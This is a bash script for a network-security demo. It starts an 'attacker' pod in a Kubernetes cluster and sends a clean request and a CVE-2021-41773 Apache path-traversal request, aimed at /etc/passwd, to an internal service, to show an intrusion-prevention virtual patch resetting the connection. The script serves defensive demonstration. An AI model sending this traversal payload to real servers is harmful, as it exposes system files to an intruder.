#!/usr/bin/env bash
# Send a clean request and a CVE-2021-41773 exploit to the users VM
# music-users, from a pod inside the VKS cluster music-store.
#
#   demos/vdefend-virtual-patching/attack.sh            start the pod if needed, send both
#   demos/vdefend-virtual-patching/attack.sh --delete   remove the pod
#
# The requests go to the Service users-service, which points at the
# users VM's load balancer in the Supervisor Namespace. The traffic is
# east-west: the Avi WAF in front of the store never sees it.
#
# The exploit is the Apache 2.4.49 path traversal. The users VM does not
# run Apache, so it answers 404: the point is that the request reaches
# the workload. With the virtual patch on, vDefend IDPS resets the
# connection before it does.
#
# Needs kubectl with the current context on the VKS cluster music-store.
set -euo pipefail

dir=$(cd "$(dirname "$0")" && pwd)
ns=music-store
pod=vpatch-attacker
target=${TARGET:-http://users-service.music-store.svc:5003}

if [ "${1:-}" = "--delete" ]; then
  kubectl delete -f "$dir/attacker.yaml" --ignore-not-found
  exit 0
fi

if ! kubectl -n "$ns" get pod "$pod" >/dev/null 2>&1; then
  kubectl apply -f "$dir/attacker.yaml"
fi
kubectl -n "$ns" wait --for=condition=Ready "pod/$pod" --timeout=120s >/dev/null

# Prints the HTTP code, or what curl met instead. --path-as-is keeps the
# %2e sequences in the request line as the exploit sends them.
send() {
  local label=$1 path=$2 out code
  out=$(kubectl -n "$ns" exec "$pod" -- \
    curl -s --path-as-is -m 5 -o /dev/null -w '%{http_code}' "$target$path" 2>&1) && code=0 || code=$?
  case $code in
    0) printf '%-10s %s  HTTP %s\n' "$label" "$path" "${out: -3}" ;;
    56 | 52) printf '%-10s %s  connection reset\n' "$label" "$path" ;;
    28) printf '%-10s %s  timed out\n' "$label" "$path" ;;
    *) printf '%-10s %s  curl exit %s\n' "$label" "$path" "$code" ;;
  esac
}

send clean "/health"
send exploit "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
